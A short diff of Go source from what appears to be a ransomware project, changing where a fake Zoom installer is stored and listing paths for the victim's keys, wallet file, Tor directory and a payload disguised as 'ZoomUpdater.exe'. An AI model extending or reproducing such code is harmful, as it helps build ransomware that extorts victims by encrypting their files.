@@ -10,6 +10,7 @@ const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 
 var (
     workDir = os.Getenv("APPDATA") + `\Zoomer`
+    tempDir = os.Getenv("TMP")
 
     victimEthereumWallet = workDir + `\a.flu`
     victimPublicKey      = workDir + `\b.flu`
@@ -18,7 +19,7 @@ var (
     victimAESKey         = workDir + `\e.flu`
 
     torDirectory  = workDir + `\Tor`
-    zoomInstaller = workDir + `\ZoomInstaller.exe`
+    zoomInstaller = tempDir + `\ZoomInstaller.exe`
     cryptoPayload = workDir + `\ZoomUpdater.exe`
 
     // cast magicBytes to array lol, very safe indeed
